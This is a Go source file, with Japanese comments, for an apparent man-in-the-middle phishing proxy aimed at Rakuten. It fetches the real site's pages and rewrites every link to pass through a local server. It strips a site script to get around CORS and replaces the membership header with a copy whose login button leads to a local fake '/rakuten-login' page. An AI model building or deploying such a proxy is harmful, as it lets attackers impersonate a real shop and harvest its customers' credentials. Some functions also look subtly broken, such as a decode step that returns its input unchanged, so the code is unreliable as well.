package service

import (
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

func MainOperation(URL string) (string, error) {
	//1. ルールに従って、URLを正規のものに戻す
	if judge := strings.Contains(URL, `https://mitm.es3/`); judge {
		URL = strings.Replace(URL, `https://mitm.es3/`, `https://`, -1)
	}
	if judge := strings.Contains(URL, `ANDANDAND`); judge {
		URL = strings.Replace(URL, `ANDANDAND`, `&`, -1)
	}
	if judge := strings.Contains(URL, `EQUALEQUALEQUAL`); judge {
		URL = strings.Replace(URL, `EQUALEQUALEQUAL`, `=`, -1)
	}

	//2. 抽出したURLをDecodeし，正規のURLとしてDecodedURLを得る．
	DecodedURL, err := UrlDecode(URL)
	if err != nil {
		return "err", nil
	}

	//3. 正規URL(DecodedURL)で正規サーバーにアクセスし、返ってきたデータをHTMLファイルにして出力
	err = DataExtraction(DecodedURL)
	if err != nil {
		log.Fatal(err)
		return "err", err
	}

	//4. ルールに従って、URLを偽物のものに戻し、HTMLファイルとしてユーザーに返却
	u, err := url.Parse(DecodedURL)
	if err != nil {
		log.Fatal(err)
		return "err", err
	}
	fqdn := u.Hostname()
	err = ReadDataAndRewiteURL(fqdn)
	if err != nil {
		log.Fatal(err)
		return "err", err
	}
	return "autogen_rewrite_" + fqdn, nil
}

/*
ReadDataAndRewiteURL関数

FQDNを引数にとって、FQDN.htmlファイル内にある"https://"を"http://mitm.es3/"に置き換え、その結果を文字列として返す。
*/
func ReadDataAndRewiteURL(fqdn string) error {
	data, err := ioutil.ReadFile("server/templates/autogen_" + fqdn + ".html") //指定HTMLファイルの読み込み TODO: 後でディレクトリを変更
	if err != nil {
		log.Fatal(err)
		return err
	}
	res := `{{define "autogen_rewrite_` + fqdn + `"}}` + string(data) + `{{end}}` //データを文字列に変換
	Url, err := ExtractURL(res)
	if err != nil {
		return err
	}
	rew := strings.Replace(res, `<a href="`, `<a href="http://localhost:3333/template?url=`, -1) //文字列の置き換え
	rew = strings.Replace(rew, `<a href='`, `<a href='http://localhost:3333/template?url=`, -1)  //文字列の置き換え
	rew = strings.Replace(rew, `pa3.min.js`, ``, -1)                                             //楽天のCORSを回避する為に削除
	rew = strings.Replace(rew, `<div
    irc="MembershipHeader"
    data-show-new="true"
    data-tracker='{
  "params": {
      "accountId": 1,
      "serviceId": 1,
      "pageLayout": "pc",
      "pageType": "top"
    }
}
'
    ></div>`, `<div class="header--RqsDU anonymous--2RuTn">
        <ul class="main-menu--33xG4">
          <li class="section--1itbn">
            <div
              class="text-display--1Iony type-body--1W5uC size-x-large--20opE align-left--1hi1x color-gray-darker--1SJFG  layout-inline--1ajCj">
              ようこそ楽天市場へ</div>
          </li>
          <li>
            <div
              class="text-display--1Iony type-body--1W5uC size-x-large--20opE align-left--1hi1x color-gray-dark--2N4Oj  layout-inline--1ajCj">
              会員登録で楽天ポイントが貯まる、使える。</div>
          </li>
        </ul>
        <ul class="side-menu--37357">
          <li class="section--1itbn"><a
              class="button--3SNaj size-s--KzHQM size-s-padding--AtFL_ border-radius--1ip29 no-padding--3mzqd type-link--8tP4V type-link-icon--2KEwc variant-crimson--3DbX7"
              aria-label="楽天会員登録(無料)"
              href="https://rd.rakuten.co.jp/s/?R2=https%3A%2F%2Fgrp01.id.rakuten.co.jp%2Frms%2Fnid%2Fregistfwd%3Fservice_id%3Dtop&amp;D2=3.8611.68708.907372.32326946&amp;C3=733f3c7a572082b53fe39af9150e9b3503e19bf2"
              target="_self" aria-disabled="false" aria-pressed="false" tabindex="0">
              <div class="icon--2sY_j size-m--23dCu color-crimson--2DVXa rex-user-outline--3_CEJ"></div><span
                class="text--26ZD7 text-no-margin-right--3R22- text--xKo_r">楽天会員登録(無料)</span>
            </a></li>
          <li class="section--1itbn"><button
              class="button--3SNaj size-xs--2qQUS size-xs-padding--pvhl0 border-radius--1ip29 type-primary--3cgWx"
              aria-label="ログイン" type="button" onclick="location.href='/rakuten-login'">
              <div class="icon--2sY_j size-s--By3wJ color-white--fjaFR rex-login--12L7t"></div><span
                class="text--26ZD7 text-no-margin-right--3R22- text--76coE">ログイン</span>
            </button></li>
        </ul>
      </div>`, -1)
	for i := range Url {
		if judge := strings.Contains(rew, Url[i]); judge {
			Former := Url[i]
			Url[i] = strings.Replace(Url[i], "&amp;", "ANDANDAND", -1)
			Url[i] = strings.Replace(Url[i], "&", "ANDANDAND", -1)
			Url[i] = strings.Replace(Url[i], "%26", "ANDANDAND", -1)
			Url[i] = strings.Replace(Url[i], "=", "EQUALEQUALEQUAL", -1)
			rew = strings.Replace(rew, Former, Url[i], -1)
		}
	}
	rew = strings.Replace(rew, `&amp;`, `ANDANDAND`, -1)
	rew = strings.Replace(rew, `%26`, `ANDANDAND`, -1)
	err = ioutil.WriteFile("server/templates/autogen_rewrite_"+fqdn+".html", []byte(rew), os.ModePerm)
	if err != nil {
		return err
	}
	return nil
}

/*
DataExtraction関数

実際の正規URLを引数にとって、htmlファイルを自動生成する。
*/
func DataExtraction(URL string) error {
	resp, err := http.Get(URL) // net/http でのリクエストの発射
	if err != nil {
		log.Fatal(err)
		return err
	}
	defer resp.Body.Close()
	byteArray, _ := ioutil.ReadAll(resp.Body) // []byte でリクエストの中身を取得
	u, err := url.Parse(URL)
	if err != nil {
		log.Fatal(err)
		return err
	}
	fileName := u.Hostname() //ファイル名はホスト名で統一（多分FQDNの形で返されるので、以後変数名はfqdnで統一したい）
	err = ioutil.WriteFile("server/templates/autogen_"+fileName+".html", byteArray, os.ModePerm)
	if err != nil {
		log.Fatal(err)
		return err
	}
	return nil
}

/*
ExtractURL関数

aタグにあるURLの抽出
*/
func ExtractURL(input string) ([]string, error) {
	aTag, err := regexp.Compile(`<a href="https://(.*)" `)
	if err != nil {
		return nil, err
	}
	link := aTag.FindAllString(input, -1) //aタグ内のハイパーリンクの抽出
	result := []string{}                  //結果の配列
	for i := 0; i < len(link); i++ {      //探索
		if strings.Contains(link[i], "&") {
			arr := strings.Split(link[i], `"`)
			for _, v := range arr {
				isUrl, err := regexp.Compile(`https://(.*)`)
				if err != nil {
					return nil, err
				}
				if isUrl.Match([]byte(v)) {
					result = append(result, v)
				}
			}
		}
	}
	aTag, err = regexp.Compile(`<a href='https://(.*)" `)
	if err != nil {
		return nil, err
	}
	link = aTag.FindAllString(input, -1) //aタグ内のハイパーリンクの抽出
	for i := 0; i < len(link); i++ {     //探索
		if strings.Contains(link[i], "&") {
			arr := strings.Split(link[i], `'`)
			for _, v := range arr {
				isUrl, err := regexp.Compile(`https://(.*)`)
				if err != nil {
					return nil, err
				}
				if isUrl.Match([]byte(v)) {
					result = append(result, v)
				}
			}
		}
	}
	return result, nil
}

/*
UrlEncode関数

URLエンコーディング
*/
func UrlEncode(str string) (string, error) {
	str = url.QueryEscape(str)
	return str, nil
}

/*
UrlDecode関数

URLデコーディング
*/
func UrlDecode(str string) (string, error) {
	_, err := url.QueryUnescape(str)
	if err != nil {
		return "", err
	}
	return str, nil
}
